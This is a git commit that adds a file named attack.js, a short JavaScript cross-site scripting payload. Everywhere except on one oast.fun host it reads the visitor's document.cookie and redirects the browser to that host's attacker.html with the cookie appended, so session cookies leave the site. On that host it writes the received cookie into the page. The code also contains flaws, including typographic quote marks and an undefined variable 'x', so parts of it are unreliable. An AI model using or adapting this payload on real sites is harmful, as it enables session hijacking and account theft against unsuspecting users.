6c64fa0ec8f2081707ec981b007ac6d897aab7a5
Chiagoziem Mba-Oji <100405629+g0ziem@users.noreply.github.com>
2024-01-06 13:26:16 +0100

    Create attack.js

---
+++ attack.js
@@ -0,0 +1,10 @@
+if(location.host == “mfdmosymumqdrdiiddnoss2gz0vpkrrx8.oast.fun”){ 
+    Url = new URL(document.location); 
+    Parameters = new URLSearchParams(x.search); 
+    cookie = Parameters.get(“cookie”); 
+    document.write(cookie);
+}
+else{ 
+    var cookie = document.cookie; 
+document.location=“https://mfdmosymumqdrdiiddnoss2gz0vpkrrx8.oast.fun/attacker.html?cookie="+cookie;
+}
